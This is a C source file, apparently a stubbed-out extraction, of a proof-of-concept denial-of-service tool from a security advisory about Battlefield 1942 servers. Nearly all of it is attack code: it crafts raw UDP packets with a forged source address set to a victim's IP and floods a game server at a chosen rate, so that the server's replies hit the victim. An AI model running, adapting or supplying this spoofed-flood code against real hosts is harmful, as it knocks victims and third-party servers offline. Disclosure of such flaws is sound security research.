
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int u_short ;
typedef void* u_int32_t ;
typedef int u_int16_t ;
typedef int u_char ;
struct udphdr {scalar_t__ check; void* len; void* dest; void* source; } ;
struct TYPE_2__ {void* s_addr; } ;
struct sockaddr_in {int sin_family; void* sin_port; TYPE_1__ sin_addr; } ;
struct sockaddr {int dummy; } ;
struct pseudohdr {void* length; void* protocol; scalar_t__ zero; void* daddr; void* saddr; } ;
struct iphdr {int ihl; int version; int tos; int id; int ttl; void* daddr; void* saddr; scalar_t__ check; void* protocol; scalar_t__ frag_off; int tot_len; } ;
typedef int peer ;


 int AF_INET ;
 int BUFFSZ ;
 int DATASZ ;
 int DSTPORT ;
 int IPPROTO_RAW ;
 void* IPPROTO_UDP ;
 int IPSZ ;
 int PSEUDOSZ ;
 int SIZE ;
 int SOCK_RAW ;
 int SRCPORT ;
 int * STRING ;
 int UDPSZ ;
 int atoi (char*) ;
 int close (int) ;
 int exit (int) ;
 int fprintf (int ,char*,char*) ;
 void* htons (int) ;
 scalar_t__ in_cksum (int *,int) ;
 int memcpy (int *,int *,int) ;
 int printf (char*) ;
 struct pseudohdr* pseudohdr ;
 void* resolv (char*) ;
 int sendto (int,int *,int ,int ,struct sockaddr*,int) ;
 int setbuf (int ,int *) ;
 int socket (int ,int ,int ) ;
 int std_err () ;
 int stderr ;
 int stdout ;
 int usleep (int) ;

int main(int argc, char *argv[]) {

 u_char buff[BUFFSZ],
  pseudobuff[BUFFSZ],
  *data;
 struct sockaddr_in peer;
 struct iphdr *iphdr;
 struct udphdr *udphdr;
 int shandle,
  err;
 u_int32_t source,
   dest;
 u_int16_t sport,
   dport;

 int packetsent;
 int maxpackets;
 int pktdoubler;
 int bandwidth;

 printf("\r\n---------------------------------------------------\r\n");
 printf("      Game Server DoS  -  Proof-of-Concept\r\n");
 printf("   by Mike Kristovich, PivX Security Researcher\r\n");
 printf("= http://www.PivX.com :    : mkristovich@pivx.com =\r\n");
 printf("---------------------------------------------------\r\n");
 printf("= Advisory MK#001 :        : Battlefield 1942 DoS =\r\n");
 printf("---------------------------------------------------\r\n");



 setbuf(stdout, ((void*)0));

 if(argc < 4)
 {
   fprintf(stderr,"Usage: %s <IP_to_flood> <Server_IP> <kBps_to_use> <#_packets>\r\n",*argv);
   printf(":: Options :: <victim_port[default 53]> <server_port[default 23000]>\r\n");
   exit(1);
        };

 source = resolv(argv[1]);
 dest = resolv(argv[2]);

 if (!argv[6])
          dport = DSTPORT;
 else
   dport = atoi(argv[6]);

 if (!argv[5])
    sport = SRCPORT;
 else
    sport = atoi(argv[5]);


 printf("Sending packets to server ...");


 peer.sin_addr.s_addr = dest;
 peer.sin_port = htons(dport);
 peer.sin_family = AF_INET;

 iphdr = (struct iphdr *)buff;
 udphdr = (struct udphdr *)(buff + IPSZ);
 data = (u_char *)(buff + IPSZ + UDPSZ);
 pseudohdr = (struct pseudohdr *)pseudobuff;


 memcpy(data, STRING, DATASZ);


 iphdr->ihl = 5;
 iphdr->version = 4;
 iphdr->tos = 0x8;
 iphdr->tot_len = SIZE;
 iphdr->id = 156;
 iphdr->frag_off = 0;
 iphdr->ttl = 128;
 iphdr->protocol = IPPROTO_UDP;
 iphdr->check = 0;
 iphdr->saddr = source;
 iphdr->daddr = dest;


 udphdr->source = htons(sport);
 udphdr->dest = htons(dport);
 udphdr->check = 0;
 udphdr->len = htons(UDPSZ + DATASZ);


 memcpy(pseudobuff + PSEUDOSZ, buff + IPSZ, UDPSZ + DATASZ);

 pseudohdr->saddr = iphdr->saddr;
 pseudohdr->daddr = iphdr->daddr;
 pseudohdr->zero = 0;
 pseudohdr->protocol = IPPROTO_UDP;
 pseudohdr->length = udphdr->len;

 udphdr->check = in_cksum((u_short *)pseudobuff, PSEUDOSZ + UDPSZ + DATASZ);


 shandle = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 if(shandle < 0) std_err();




 maxpackets = atoi(argv[4]);

 bandwidth = atoi(argv[3]);

 for (packetsent = 0; packetsent < maxpackets; packetsent++) {

   for (pktdoubler = 0; pktdoubler < bandwidth; pktdoubler++) {
            err = sendto(shandle, buff, SIZE, 0, (struct sockaddr *)&peer, sizeof(peer));
          if(err < 0) std_err();
     packetsent++;
   };
     usleep(24000);

 };

 printf("\r\nSpoofed packets sent to Battlefield 1942 server.\r\n");
 close(shandle);

 return(0);
}
